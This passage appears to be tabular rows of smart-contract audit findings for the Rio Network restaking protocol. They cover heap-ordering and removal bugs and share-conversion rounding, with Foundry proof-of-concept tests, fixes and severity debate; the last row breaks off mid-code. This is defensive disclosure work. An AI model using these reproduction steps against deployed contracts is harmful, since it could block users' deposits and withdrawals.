`reportOutOfOrderValidatorExits` does not updates the heap orderчhighч```\nfunction getOperatorUtilizationHeapForETH(RioLRTOperatorRegistryStorageV1.StorageV1 storage s)\n        internal\n        view\n        returns (OperatorUtilizationHeap.Data memory heap)\n    {\n        uint8 numActiveOperators = s.activeOperatorCount;\n        if (numActiveOperators == 0) return OperatorUtilizationHeap.Data(new OperatorUtilizationHeap.Operator[](0), 0);\n\n        heap = OperatorUtilizationHeap.initialize(MAX_ACTIVE_OPERATOR_COUNT);\n\n        uint256 activeDeposits;\n        IRioLRTOperatorRegistry.OperatorValidatorDetails memory validators;\n        unchecked {\n            uint8 i;\n            for (i = 0; i < numActiveOperators; ++i) {\n                uint8 operatorId = s.activeOperatorsByETHDepositUtilization.get(i);\n\n                // Non-existent operator ID. We've reached the end of the heap.\n                if (operatorId == 0) break;\n\n                validators = s.operatorDetails[operatorId].validatorDetails;\n                activeDeposits = validators.deposited - validators.exited;\n                heap.operators[i + 1] = OperatorUtilizationHeap.Operator({\n                    id: operatorId,\n                    utilization: activeDeposits.divWad(validators.cap)\n                });\n            }\n            heap.count = i;\n        }\n    }\n```\nч"When an operator's validator exits without a withdrawal request, the owner can invoke the `reportOutOfOrderValidatorExits` function to increase the `exited` portion of the operator validators. However, this action does not update the heap. Consequently, during subsequent allocation or deallocation processes, the heap may incorrectly mark validators as `exited`.\nFirst, let's see how the utilization is determined for native ETH deposits for operators which is calculated as: `operatorShares.allocation.divWad(operatorShares.cap)` where as the allocation is the total `deposited` validators and the `cap` is predetermined value by the owner of the registry.\nWhen the heap is retrieved from the storage, here how it is fetched:\n```\nfunction getOperatorUtilizationHeapForETH(RioLRTOperatorRegistryStorageV1.StorageV1 storage s)\n        internal\n        view\n        returns (OperatorUtilizationHeap.Data memory heap)\n    {\n        uint8 numActiveOperators = s.activeOperatorCount;\n        if (numActiveOperators == 0) return OperatorUtilizationHeap.Data(new OperatorUtilizationHeap.Operator[](0), 0);\n\n        heap = OperatorUtilizationHeap.initialize(MAX_ACTIVE_OPERATOR_COUNT);\n\n        uint256 activeDeposits;\n        IRioLRTOperatorRegistry.OperatorValidatorDetails memory validators;\n        unchecked {\n            uint8 i;\n            for (i = 0; i < numActiveOperators; ++i) {\n                uint8 operatorId = s.activeOperatorsByETHDepositUtilization.get(i);\n\n                // Non-existent operator ID. We've reached the end of the heap.\n                if (operatorId == 0) break;\n\n                validators = s.operatorDetails[operatorId].validatorDetails;\n                activeDeposits = validators.deposited - validators.exited;\n                heap.operators[i + 1] = OperatorUtilizationHeap.Operator({\n                    id: operatorId,\n                    utilization: activeDeposits.divWad(validators.cap)\n                });\n            }\n            heap.count = i;\n        }\n    }\n```\n\nas we can see, the heap is always assumed to be order in the storage when the registry fetches it initially. There are no ordering of the heap when requesting the heap initially.\nWhen, say the deallocation happens via an user withdrawal request, the queue can exit early if the operator in the heap has ""0"" room:\n```\n function deallocateETHDeposits(uint256 depositsToDeallocate) external onlyCoordinator returns (uint256 depositsDeallocated, OperatorETHDeallocation[] memory deallocations) {\n        deallocations = new OperatorETHDeallocation[](s.activeOperatorCount);\n\n\n        OperatorUtilizationHeap.Data memory heap = s.getOperatorUtilizationHeapForETH();\n        if (heap.isEmpty()) revert NO_AVAILABLE_OPERATORS_FOR_DEALLOCATION();\n\n\n        uint256 deallocationIndex;\n        uint256 remainingDeposits = depositsToDeallocate;\n\n\n        bytes memory pubKeyBatch;\n        while (remainingDeposits > 0) {\n            uint8 operatorId = heap.getMax().id;\n\n\n            OperatorDetails storage operator = s.operatorDetails[operatorId];\n            OperatorValidatorDetails memory validators = operator.validatorDetails;\n            -> uint256 activeDeposits = validators.deposited - validators.exited;\n\n\n            // Exit early if the operator with the highest utilization rate has no active deposits,\n            // as no further deallocations can be made.\n            -> if (activeDeposits == 0) break;\n             .\n        }\n        .\n    }\n```\n\n`reportOutOfOrderValidatorExits` increases the ""exited"" part of the operators validator:\n```\nfunction reportOutOfOrderValidatorExits(uint8 operatorId, uint256 fromIndex, uint256 validatorCount) external {\n       .\n       .\n        // Swap the position of the validators starting from the `fromIndex` with the validators that were next in line to be exited.\n        VALIDATOR_DETAILS_POSITION.swapValidatorDetails(operatorId, fromIndex, validators.exited, validatorCount);\n        -> operator.validatorDetails.exited += uint40(validatorCount);\n\n        emit OperatorOutOfOrderValidatorExitsReported(operatorId, validatorCount);\n    }\n```\n\nNow, knowing all these above, let's do an example where calling `reportOutOfOrderValidatorExits` can make the heap work wrongly and exit prematurely.\nAssume there are 3 operators which has native ETH deposits. operatorId 1 -> utilization 5% operatorId 2 -> utilization 10% operatorId 3 -> utilization 15%\nsuch operators would be ordered in the heap as: heap.operators[1] -> operatorId: 1, utilization: 5 heap.operators[2] -> operatorId: 2, utilization: 10 heap.operators[3] -> operatorId: 3, utilization: 15 heap.getMin() -> operatorId: 1, utilization: 5 heap.getMax() -> operatorId:3, utilization 15\nnow, let's say the ""cap"" is 100 for all of the operators which means that: operatorId 1 -> validator.deposits = 5, validator.exit = 0 operatorId 2 -> validator.deposits = 10, validator.exit = 0 operatorId 3 -> validator.deposits = 15, validator.exit = 0\nLet's assume that the operator 3 exits 15 validator from beacon chain without prior to a user request, which is a reason for owner to call `reportOutOfOrderValidatorExits` to increase the exited validators.\nWhen the owner calls `reportOutOfOrderValidatorExits` for the operatorId 3, the exited will be 15 for the operatorId 3. After the call the operators validator balances will be: operatorId 1 -> validator.deposits = 5, validator.exit = 0 operatorId 2 -> validator.deposits = 10, validator.exit = 8 operatorId 3 -> validator.deposits = 15, validator.exit = 15\nhence, the utilizations will be: operatorId 1 -> utilization 5% operatorId 2 -> utilization 10% operatorId 3 -> utilization 0%\nwhich means now the operatorId 3 has the lowest utilization and should be the first to get deposits and last to unwind deposits from. However, the heap is not re-ordered meaning that the minimum in the heap is still opeartorId 1 and the maximum is still operatorId 3!\nNow, when a user tries to withdraw, the first deallocation target will be the operatorId 3 because the heap thinks that it is the most utilized still.\nHence, the user will not be able to request the withdrawal!\nCoded PoC:\n```\n// forge test --match-contract OperatorUtilizationHeapTest --match-test test_RemovingValidatorMessesTheHeap -vv\n    function test_RemovingValidatorMessesTheHeap() public {\n        OperatorUtilizationHeap.Data memory heap = OperatorUtilizationHeap.initialize(5);\n\n        // @review initialize and order 3 operators \n        heap.insert(OperatorUtilizationHeap.Operator({id: 1, utilization: 5}));\n        heap.store(heapStore);\n\n        heap.insert(OperatorUtilizationHeap.Operator({id: 2, utilization: 10}));\n        heap.store(heapStore);\n\n        heap.insert(OperatorUtilizationHeap.Operator({id: 3, utilization: 15}));\n        heap.store(heapStore);\n\n        // @review mimick how the heap can be fetched from the storage initially\n        uint8 numActiveOperators = 3;\n        OperatorUtilizationHeap.Data memory newHeap = OperatorUtilizationHeap.initialize(64);\n        uint8 i;\n        for (i = 0; i < numActiveOperators; ++i) {\n            uint8 operatorId = heapStore.get(i);\n            if (operatorId == 0) break;\n\n            newHeap.operators[i+1] = OperatorUtilizationHeap.Operator({\n                   id: operatorId,\n                   utilization: heap.operators[operatorId].utilization\n            });\n        }\n        newHeap.count = i;\n\n        // @review assume the reportValidatorAndExits called, and now the utilization is ""0""\n        heap.updateUtilizationByID(3, 0);\n        // @review this should be done, but the heap is not stored! \n        // heap.store(heapStore);\n\n        console.log(""1st"", heap.operators[1].id);\n        console.log(""2nd"", heap.operators[2].id);\n        console.log(""3rd"", heap.operators[3].id);\n        console.log(""origin heaps min"", heap.getMin().id);\n        console.log(""origin heaps max"", heap.getMax().id);\n\n        console.log(""1st"", newHeap.operators[1].id);\n        console.log(""2nd"", newHeap.operators[2].id);\n        console.log(""3rd"", newHeap.operators[3].id);\n        console.log(""new heaps min"", newHeap.getMin().id);\n        console.log(""new heaps max"", newHeap.getMax().id);\n\n        // @review mins and maxs are mixed\n        assertEq(newHeap.getMin().id, 1);\n        assertEq(heap.getMin().id, 3);\n        assertEq(heap.getMax().id, 2);\n        assertEq(newHeap.getMax().id, 3);\n    }\n```\n"чupdate the utilization in the reportOutOfOrderValidatorExits function\nDiscussion\nsherlock-admin4\nThe protocol team fixed this issue in PR/commit https://github.com/rio-org/rio-sherlock-audit/pull/10.чHeap can be mixed, withdrawals and deposits can fail, hence I will label this as high.\nCode Snippet\nTool used\nManual Review
Heap is incorrectly stores the removed operator ID which can lead to division by zero in deposit/withdrawal flowчhighч```\nfunction setOperatorStrategyCap(\n        RioLRTOperatorRegistryStorageV1.StorageV1 storage s,\n        uint8 operatorId,\n        IRioLRTOperatorRegistry.StrategyShareCap memory newShareCap\n    ) internal {\n        .\n        OperatorUtilizationHeap.Data memory utilizationHeap = s.getOperatorUtilizationHeapForStrategy(newShareCap.strategy);\n        // If the current cap is greater than 0 and the new cap is 0, remove the operator from the strategy.\n        if (currentShareDetails.cap > 0 && newShareCap.cap == 0) {\n            // If the operator has allocations, queue them for exit.\n            if (currentShareDetails.allocation > 0) {\n                operatorDetails.queueOperatorStrategyExit(operatorId, newShareCap.strategy);\n            }\n            // Remove the operator from the utilization heap.\n            -> utilizationHeap.removeByID(operatorId);\n        }\n        .\n\n        // Persist the updated heap to the active operators tracking.\n        -> utilizationHeap.store(s.activeOperatorsByStrategyShareUtilization[newShareCap.strategy]);\n         .\n    }\n```\nч"An operator's strategy can be reset by the owner calling `setOperatorStrategyCaps` to ""0"". This action sets the utilization to ""0"" and removes the operator from the heap. Consequently, this means that the operator has unwound all its strategy shares and can no longer receive any more deposits. However, due to how the heap is organized, if an operator who had funds before is reset to ""0"", the heap will not successfully remove the operator. As a result, when ordering the heap, a division by ""0"" will occur, causing the transaction to revert on deposits and withdrawals indefinitely.\nIn order to break down the issue, let's divide the issue to 2 parts which their combination is the issue itself\n1- Heap is not removing the removed ID from the heaps storage when the operator is removed\nWhen the operator is removed, the operator will be removed from the heap as follows:\n```\nfunction setOperatorStrategyCap(\n        RioLRTOperatorRegistryStorageV1.StorageV1 storage s,\n        uint8 operatorId,\n        IRioLRTOperatorRegistry.StrategyShareCap memory newShareCap\n    ) internal {\n        .\n        OperatorUtilizationHeap.Data memory utilizationHeap = s.getOperatorUtilizationHeapForStrategy(newShareCap.strategy);\n        // If the current cap is greater than 0 and the new cap is 0, remove the operator from the strategy.\n        if (currentShareDetails.cap > 0 && newShareCap.cap == 0) {\n            // If the operator has allocations, queue them for exit.\n            if (currentShareDetails.allocation > 0) {\n                operatorDetails.queueOperatorStrategyExit(operatorId, newShareCap.strategy);\n            }\n            // Remove the operator from the utilization heap.\n            -> utilizationHeap.removeByID(operatorId);\n        }\n        .\n\n        // Persist the updated heap to the active operators tracking.\n        -> utilizationHeap.store(s.activeOperatorsByStrategyShareUtilization[newShareCap.strategy]);\n         .\n    }\n```\n\n`removeByID` calls the internal `_remove` function which is NOT removes the last element! `self.count` is decreased however, the index is still the previous value of the `self.count`\n```\nfunction _remove(Data memory self, uint8 i) internal pure {\n        self.operators[i] = self.operators[self.count--];\n    }\n```\n\nFor example, if there are 3 operators as follows: operatorId: 1, utilization: 50% operatorId: 2, utilization: 60% operatorId: 3, utilization: 70% then, the `heap.count` would be 3 and the order would be: 1, 2, 3 in the heap heap.operators[1] = operatorId 1 heap.operators[2] = operatorId 2 heap.operators[3] = operatorId 3\nif we remove the operator Id 2: `heap.count` = 2 order: 1,3 heap.operators[1] = operatorId 1 heap.operators[2] = operatorId 2 heap.operators[3] = operatorId 0 THIS SHOULD BE ""0"" since its removed but it is ""3"" in the current implementation!\nAs shown here, the operators[3] should be ""0"" since there isn't any operator3 in the heap anymore but the heap keeps the value and not resets it.\nHere a test shows the above issue:\n```\n// forge test --match-contract OperatorUtilizationHeapTest --match-test test_removingDoesNotUpdatesStoredHeap -vv\n    function test_removingDoesNotUpdatesStoredHeap() public {\n        OperatorUtilizationHeap.Data memory heap = OperatorUtilizationHeap.initialize(5);\n\n        heap.insert(OperatorUtilizationHeap.Operator({id: 1, utilization: 50}));\n        heap.store(heapStore);\n\n        heap.insert(OperatorUtilizationHeap.Operator({id: 2, utilization: 60}));\n        heap.store(heapStore);\n\n        heap.insert(OperatorUtilizationHeap.Operator({id: 3, utilization: 70}));\n        heap.store(heapStore);\n\n        console.log(""Heaps count"", heap.count);\n        console.log(""1st"", heap.operators[1].id);\n        console.log(""2nd"", heap.operators[2].id);\n        console.log(""3rd"", heap.operators[3].id);\n\n        // remove 2\n        heap.removeByID(3);\n        heap.store(heapStore);\n\n        console.log(""Heaps count"", heap.count);\n        console.log(""1st"", heap.operators[1].id);\n        console.log(""2nd"", heap.operators[2].id);\n        console.log(""3rd"", heap.operators[3].id);\n    }\n```\n\nLogs:\n2- When the operator cap is reseted the allocations/deallocations will not work due to above heap issue because of division by zero\nNow, take the above example, we removed the operatorId 3 from the heap by setting its cap to ""0"". Now, there are only operators 1 and 2 active for that specific strategy. When there are idle funds in the deposit pool before the rebalance call, the excess funds that are not requested as withdrawals will be pushed to EigenLayer as follows:\n```\nfunction rebalance(address asset) external checkRebalanceDelayMet(asset) {\n       .\n       .\n        -> (uint256 sharesReceived, bool isDepositCapped) = depositPool().depositBalanceIntoEigenLayer(asset);\n        .\n    }\n```\n\n```\n function depositBalanceIntoEigenLayer(address asset) external onlyCoordinator returns (uint256, bool) {\n        uint256 amountToDeposit = asset.getSelfBalance();\n        if (amountToDeposit == 0) return (0, false);\n        .\n        .\n        -> return (OperatorOperations.depositTokenToOperators(operatorRegistry(), asset, strategy, sharesToAllocate), isDepositCapped);\n    }\n```\n\n```\nfunction depositTokenToOperators(\n        IRioLRTOperatorRegistry operatorRegistry,\n        address token,\n        address strategy,\n        uint256 sharesToAllocate\n    ) internal returns (uint256 sharesReceived) {\n       -> (uint256 sharesAllocated, IRioLRTOperatorRegistry.OperatorStrategyAllocation[] memory  allocations) = operatorRegistry.allocateStrategyShares(\n            strategy, sharesToAllocate\n        );\n        .\n        .\n    }\n```\n\n```\nfunction allocateStrategyShares(address strategy, uint256 sharesToAllocate) external onlyDepositPool returns (uint256 sharesAllocated, OperatorStrategyAllocation[] memory allocations) {\n        -> OperatorUtilizationHeap.Data memory heap = s.getOperatorUtilizationHeapForStrategy(strategy);\n       .\n       .\n       .\n       .\n    }\n```\n\n```\nfunction getOperatorUtilizationHeapForStrategy(RioLRTOperatorRegistryStorageV1.StorageV1 storage s, address strategy) internal view returns (OperatorUtilizationHeap.Data memory heap) {\n        uint8 numActiveOperators = s.activeOperatorCount;\n        if (numActiveOperators == 0) return OperatorUtilizationHeap.Data(new OperatorUtilizationHeap.Operator[](0), 0);\n        \n        heap = OperatorUtilizationHeap.initialize(MAX_ACTIVE_OPERATOR_COUNT);\n        LibMap.Uint8Map storage operators = s.activeOperatorsByStrategyShareUtilization[strategy];\n\n        IRioLRTOperatorRegistry.OperatorShareDetails memory operatorShares;\n        unchecked {\n            uint8 i;\n            for (i = 0; i < numActiveOperators; ++i) {\n                uint8 operatorId = operators.get(i);\n\n                // Non-existent operator ID. We've reached the end of the heap.\n                if (operatorId == 0) break;\n\n                operatorShares = s.operatorDetails[operatorId].shareDetails[strategy];\n                heap.operators[i + 1] = OperatorUtilizationHeap.Operator({\n                    id: operatorId,\n                    -> utilization: operatorShares.allocation.divWad(operatorShares.cap)\n                });\n            }\n            heap.count = i;\n        }\n    }\n```\n\nAs we can see in one above code snippet, the `numActiveOperators` is 3. Since the stored heaps last element is not set to ""0"" it will point to operatorId 3 which has a cap of ""0"" after the removal. This will make the\n```\nutilization: operatorShares.allocation.divWad(operatorShares.cap)\n```\n\npart of the code to perform a division by zero and the function will revert.\nCoded PoC:\n```\n// forge test --match-contract RioLRTOperatorRegistryTest --match-test test_Capped0ValidatorBricksFlow -vv\n    function test_Capped0ValidatorBricksFlow() public {\n        // Add 3 operators\n        addOperatorDelegators(reLST.operatorRegistry, address(reLST.rewardDistributor), 3);\n\n        // The caps for each operator is 1000e18, we will delete the id 2 so we need funds there\n        // any number that is more than 1000 should be ok for that experiement \n        uint256 AMOUNT = 1002e18;\n\n        // Allocate to cbETH strategy.\n        cbETH.approve(address(reLST.coordinator), type(uint256).max);\n        uint256 lrtAmount = reLST.coordinator.deposit(CBETH_ADDRESS, AMOUNT);\n\n        // Push funds into EigenLayer.\n        vm.prank(EOA, EOA);\n        reLST.coordinator.rebalance(CBETH_ADDRESS);\n\n        // Build the empty caps\n        IRioLRTOperatorRegistry.StrategyShareCap[] memory zeroStrategyShareCaps =\n            new IRioLRTOperatorRegistry.StrategyShareCap[](1);\n        zeroStrategyShareCaps[0] = IRioLRTOperatorRegistry.StrategyShareCap({strategy: CBETH_STRATEGY, cap: 0});\n\n        // Set the caps of CBETH_STRATEGY for operator 2 as ""0""\n        reLST.operatorRegistry.setOperatorStrategyShareCaps(2, zeroStrategyShareCaps);\n\n        // Try an another deposit, we expect revert when we do the rebalance\n        reLST.coordinator.deposit(CBETH_ADDRESS, 10e18);\n\n        // Push funds into EigenLayer. Expect revert, due to division by ""0""\n        skip(reETH.coordinator.rebalanceDelay());\n        vm.startPrank(EOA, EOA);\n        vm.expectRevert(bytes4(keccak256(""DivWadFailed()"")));\n        reLST.coordinator.rebalance(CBETH_ADDRESS);\n        vm.stopPrank();\n    }\n```\n"ч"When removing from the heap also remove the last element from the heap.\nI am not sure of this, but this might work\n```\nfunction _remove(Data memory self, uint8 i) internal pure {\n        self.operators[i] = self.operators[--self.count];\n    }\n```\n\nDiscussion\nsherlock-admin4\nThe protocol team fixed this issue in PR/commit https://github.com/rio-org/rio-sherlock-audit/pull/3.\nnevillehuang\nSeverity could be higher, given a use of the function correctly results in blocking of withdrawals. Leaving medium for now on grounds of admin error\nshaka0x\nEscalate\nLeaving medium for now on grounds of admin error.\nI respectfully disagree with this reasoning. I think the severity of the issue and its duplicate should be high, as there is no admin error involved. There is an error in the implementation that is produced after an admin action. Otherwise, all issues at deployment or in protected functions can technically be considered as admin errors.\nsherlock-admin2\nEscalate\nLeaving medium for now on grounds of admin error.\nI respectfully disagree with this reasoning. I think the severity of the issue and its duplicate should be high, as there is no admin error involved. There is an error in the implementation that is produced after an admin action. Otherwise, all issues at deployment or in protected functions can technically be considered as admin errors.\nYou've created a valid escalation!\nTo remove the escalation from consideration: Delete your comment.\nYou may delete or edit your escalation comment anytime before the 48-hour escalation window closes. After that, the escalation becomes final.\nnevillehuang\nAgree that this issue should be high severity since withdrawals can be blocked permanently\nCzar102\n@nevillehuang @mstpr can't the admin remediate the situation?\nnevillehuang\n@solimander Could you confirm if admin remediation is possible by resetting validator cap of removed operator? Given the intended admin workflow results in blocking of funds I think the impact is severe\nsolimander\n@nevillehuang Remediation is possible by deactivating the operator:\n```\n// forge test --mt test_capped0ValidatorBricksFlowRecovery\nfunction test_capped0ValidatorBricksFlowRecovery() public {\n    // Add 3 operators\n    addOperatorDelegators(reLST.operatorRegistry, address(reLST.rewardDistributor), 3);\n\n    // The caps for each operator is 1000e18, we will delete the id 2 so we need funds there\n    // any number that is more than 1000 should be ok for that experiement\n    uint256 AMOUNT = 1002e18;\n\n    // Allocate to cbETH strategy.\n    cbETH.approve(address(reLST.coordinator), type(uint256).max);\n    uint256 lrtAmount = reLST.coordinator.deposit(CBETH_ADDRESS, AMOUNT);\n\n    // Push funds into EigenLayer.\n    vm.prank(EOA, EOA);\n    reLST.coordinator.rebalance(CBETH_ADDRESS);\n\n    // Build the empty caps\n    IRioLRTOperatorRegistry.StrategyShareCap[] memory zeroStrategyShareCaps =\n        new IRioLRTOperatorRegistry.StrategyShareCap[](1);\n    zeroStrategyShareCaps[0] = IRioLRTOperatorRegistry.StrategyShareCap({strategy: CBETH_STRATEGY, cap: 0});\n\n    // Set the caps of CBETH_STRATEGY for operator 2 as ""0""\n    reLST.operatorRegistry.setOperatorStrategyShareCaps(2, zeroStrategyShareCaps);\n\n    // Try an another deposit, we expect revert when we do the rebalance\n    reLST.coordinator.deposit(CBETH_ADDRESS, 10e18);\n\n    // Push funds into EigenLayer. Expect revert, due to division by ""0""\n    skip(reETH.coordinator.rebalanceDelay());\n    vm.startPrank(EOA, EOA);\n    vm.expectRevert(bytes4(keccak256('DivWadFailed()')));\n    reLST.coordinator.rebalance(CBETH_ADDRESS);\n    vm.stopPrank();\n\n    // Deactivate the operator to recover the system\n    reLST.operatorRegistry.deactivateOperator(2);\n\n    // Rebalance succeeds\n    vm.prank(EOA, EOA);\n    reLST.coordinator.rebalance(CBETH_ADDRESS);\n}\n```\n\nThis acts as a temporary fix, which would unblock rebalances while the issue is patched.\nmstpr\n@nevillehuang @mstpr can't the admin remediate the situation?\nnot really.\nThe admin needs to reset the cap for the operator. However, when this happens, the operator's cap is reset to ""0,"" allowing deposits to be made again. If the admin sets an operator's cap to ""0,"" it's likely that the operator will not be used. To address the above issue, the admin must reset it to a value. However, this means that new deposits can be made to the operator. Although the admin can set the cap back to a value, all users must withdraw their funds before new deposits are made. Since the admin does not control all users, this is not feasible and cannot be fixed in my opinion.\nIf the operator is deactivated instead of its cap resetted to ""0"" then it is even worse. Then, the admin has to readd the operator back to system and needs to push funds to that operator such that the heap reorders correctly. Though, to do that admin needs significant amount of funds to push to system to increase the utilization.\nOverall it might be possible but it is extremely hard and requires capital. What do you think @shaka0x @itsabinashb ?\nshaka0x\n@nevillehuang @mstpr can't the admin remediate the situation?\nnot really.\nThe admin needs to reset the cap for the operator. However, when this happens, the operator's cap is reset to ""0,"" allowing deposits to be made again. If the admin sets an operator's cap to ""0,"" it's likely that the operator will not be used. To address the above issue, the admin must reset it to a value. However, this means that new deposits can be made to the operator. Although the admin can set the cap back to a value, all users must withdraw their funds before new deposits are made. Since the admin does not control all users, this is not feasible and cannot be fixed in my opinion.\nIf the operator is deactivated instead of its cap resetted to ""0"" then it is even worse. Then, the admin has to readd the operator back to system and needs to push funds to that operator such that the heap reorders correctly. Though, to do that admin needs significant amount of funds to push to system to increase the utilization.\nOverall it might be possible but it is extremely hard and requires capital. What do you think @shaka0x @itsabinashb ?\nI do agree with the above comments and would like to add that the proposed solution will not work for the cases described in my PoCs (https://github.com/sherlock-audit/2024-02-rio-network-core-protocol-judging/issues/316), where the bug appears after deactivating an operator.\nCzar102\n@solimander do you agree with the above comments?\n@itsabinashb please do not post unnecessarily long code/result snippets directly in a comment, it's better to put them in a gist.\nIf @solimander agrees, I'm planning to accept the escalation and consider this issue a valid High severity one.\nsolimander\n@Czar102 After reviewing @shaka0x's POCs, I do agree with the above comments.\nCzar102\nResult: High Has duplicates\nsherlock-admin3\nEscalations have been resolved successfully!\nEscalation status:\nshaka0x: accepted\nzrax-x\n@nevillehuang Is issue#16 a duplicate? I can't seem to understand what the problem described in issue#16 is. I believe that it misses the point and has no negative impact. And issue#155, issue#127.\nitsabinashb\nIs issue#16 a duplicate? I can't seem to understand what the problem described in issue#16 is. I believe that it misses the point and has no negative impact. And issue#155.\nIssue number 16 shows exact root cause which is same as this submission.\nzrax-x\nIs issue#16 a duplicate? I can't seem to understand what the problem described in issue#16 is. I believe that it misses the point and has no negative impact. And issue#155.\nIssue number 16 shows exact root cause which is same as this submission.\nHowever, you did not accurately describe the harm caused, which is ""division by zero"".\nsolimander\nI do agree that #16 does sort of miss the point as the core issue is not mentioned. The issue is not that the removed operator ID still exists in memory, but that it's not correctly removed from storage."чCore logic broken, withdrawal/deposits can not be performed.\nCode Snippet\nTool used\nManual Review
Depositing to EigenLayer can revert due to round downs in converting shares<->assetsчmediumч```\nfunction rebalance(address asset) external checkRebalanceDelayMet(asset) {\n        .\n        .\n        // Deposit remaining assets into EigenLayer.\n        (uint256 sharesReceived, bool isDepositCapped) = depositPool().depositBalanceIntoEigenLayer(asset);\n        .\n    }\n```\nчWhen the underlying tokens deposited from depositPool to EigenLayer strategy, there are bunch of converting operations done which rounds down the solution at some point and the require check reverts hence, the depositing might not be possible due to this small round down issue.\nBest to go for this is an example, so let's do it.\nAssume the deposit pool has 111 * 1e18 stETH waiting for rebalance to be deposited to EigenLayer and there is only 1 operator with 1 strategy allowed which is the EigenLayers stETH strategy. Also, assume the EigenLayer has 3333 * 1e18 stETH in total and 3232 * 1e18 shares in supply. Also, note that the EigenLayer uses virtual shares offset which is 1e3.\nNow, let's say there is no withdrawal queue to ease the complexity of the issue and rebalance is called and the balance in the deposit pool will be forwarded to EigenLayer strategy as follows:\n```\nfunction rebalance(address asset) external checkRebalanceDelayMet(asset) {\n        .\n        .\n        // Deposit remaining assets into EigenLayer.\n        (uint256 sharesReceived, bool isDepositCapped) = depositPool().depositBalanceIntoEigenLayer(asset);\n        .\n    }\n```\n\nThen, the `depositBalanceIntoEigenLayer` will trigger the `OperatorOperations.depositTokenToOperators` function as follows:\n```\nfunction depositBalanceIntoEigenLayer(address asset) external onlyCoordinator returns (uint256, bool) {\n        uint256 amountToDeposit = asset.getSelfBalance();\n        if (amountToDeposit == 0) return (0, false);\n        .\n        .\n        address strategy = assetRegistry().getAssetStrategy(asset);\n        uint256 sharesToAllocate = assetRegistry().convertToSharesFromAsset(asset, amountToDeposit);\n        // @review library called\n        -> return (OperatorOperations.depositTokenToOperators(operatorRegistry(), asset, strategy, sharesToAllocate), isDepositCapped);\n    }\n```\n\nAs we can see in the above snippet, the underlying tokens to be deposited which is 111 * 1e18 stETH in our example will be converted to EigenLayer strategy shares via `assetRegistry().convertToSharesFromAsset`\nNow, how does EigenLayer calculates how much shares to be minted given an underlying token deposit is as follows:\n```\nfunction underlyingToSharesView(uint256 amountUnderlying) public view virtual returns (uint256) {\n        // account for virtual shares and balance\n        uint256 virtualTotalShares = totalShares + SHARES_OFFSET;\n        uint256 virtualTokenBalance = _tokenBalance() + BALANCE_OFFSET;\n        // calculate ratio based on virtual shares and balance, being careful to multiply before dividing\n        return (amountUnderlying * virtualTotalShares) / virtualTokenBalance;\n    }\n```\n\nNow, let's plugin our numbers in the example to calculate how much shares would be minted according to EigenLayer: `virtualTotalShares` = 3232 * 1e18 + 1e3 `virtualTokenBalance` = 3333 * 1e18 + 1e3 `amountUnderlying` = 111 * 1e18\nand when we do the math we will calculate the shares to be minted as: 107636363636363636364\nThen, the library function will be executed as follows:\n```\nfunction depositTokenToOperators(\n        IRioLRTOperatorRegistry operatorRegistry,\n        address token,\n        address strategy,\n        uint256 sharesToAllocate // @review 107636363636363636364 as we calculated above!\n    ) internal returns (uint256 sharesReceived) {\n        (uint256 sharesAllocated, IRioLRTOperatorRegistry.OperatorStrategyAllocation[] memory  allocations) = operatorRegistry.allocateStrategyShares(\n            strategy, sharesToAllocate\n        );\n\n        for (uint256 i = 0; i < allocations.length; ++i) {\n            IRioLRTOperatorRegistry.OperatorStrategyAllocation memory allocation = allocations[i];\n\n            IERC20(token).safeTransfer(allocation.delegator, allocation.tokens);\n            sharesReceived += IRioLRTOperatorDelegator(allocation.delegator).stakeERC20(strategy, token, allocation.tokens);\n        }\n        if (sharesReceived != sharesAllocated) revert INCORRECT_NUMBER_OF_SHARES_RECEIVED();\n    }\n```\n\nThe very first line of the above snippet executes the `operatorRegistry.allocateStrategyShares`, let's examine that:\n```\n function allocateStrategyShares(address strategy, uint256 sharesToAllocate) external onlyDepositPool returns (uint256 sharesAllocated, OperatorStrategyAllocation[] memory allocations) {\n        .\n        uint256 remainingShares = sharesToAllocate;\n        allocations = new OperatorStrategyAllocation[](s.activeOperatorCount);\n        while (remainingShares > 0) {\n            .\n            .\n            uint256 newShareAllocation = FixedPointMathLib.min(operatorShares.cap - operatorShares.allocation, remainingShares);\n            uint256 newTokenAllocation = IStrategy(strategy).sharesToUnderlyingView(newShareAllocation);\n            allocations[allocationIndex] = OperatorStrategyAllocation(\n                operator.delegator,\n                newShareAllocation,\n                newTokenAllocation\n            );\n            remainingShares -= newShareAllocation;\n            .\n            .\n        }\n        sharesAllocated = sharesToAllocate - remainingShares;\n        .\n        .\n    }\n```\n\nSo, let's value the above snippet aswell considering the cap is not reached. As we can see the how much underlying token needed is again calculated by querying the EigenLayer strategy `sharesToUnderlyingView`, so let's first calculate that:\n```\nfunction sharesToUnderlyingView(uint256 amountShares) public view virtual override returns (uint256) {\n        // account for virtual shares and balance\n        uint256 virtualTotalShares = totalShares + SHARES_OFFSET;\n        uint256 virtualTokenBalance = _tokenBalance() + BALANCE_OFFSET;\n        // calculate ratio based on virtual shares and balance, being careful to multiply before dividing\n        return (virtualTokenBalance * amountShares) / virtualTotalShares;\n    }\n```\n\nLet's put the values to above snippet: `virtualTotalShares` = 3232 * 1e18 + 1e3 `virtualTokenBalance` = 3333 * 1e18 + 1e3 `amountShares` = 107636363636363636364 hence, the return value is 110999999999999999999(as you noticed it is not 111 * 1e18 as we expect!)\n`sharesToAllocate` = remainingShares = newShareAllocation = 107636363636363636364 `newTokenAllocation` = 110999999999999999999 `sharesAllocated` = 107636363636363636364\nNow, let's go back to `depositTokenToOperators` function and move with the execution flow:\nas we can see the underlying tokens we calculated (110999999999999999999) is deposited to EigenLayer for shares here and then compared in the last line in the if check as follows:\n```\nfor (uint256 i = 0; i < allocations.length; ++i) {\n            IRioLRTOperatorRegistry.OperatorStrategyAllocation memory allocation = allocations[i];\n\n            IERC20(token).safeTransfer(allocation.delegator, allocation.tokens);\n            sharesReceived += IRioLRTOperatorDelegator(allocation.delegator).stakeERC20(strategy, token, allocation.tokens);\n        }\n        if (sharesReceived != sharesAllocated) revert INCORRECT_NUMBER_OF_SHARES_RECEIVED();\n```\n\n`stakeERC20` will stake 110999999999999999999 tokens and in exchange will receive 107636363636363636363 shares. Then the `sharesReceived` will be compared with the initial share amount calculation which is 107636363636363636364\nhence, the last if check will revert because 107636363636363636363 != 107636363636363636364\nCoded PoC:\n```\nfunction test_RioRoundingDownPrecision() external pure returns (uint, uint) {\n        uint underlyingTokens = 111 * 1e18;\n        uint totalUnderlyingTokensInEigenLayer = 3333 * 1e18;\n        uint totalSharesInEigenLayer = 3232 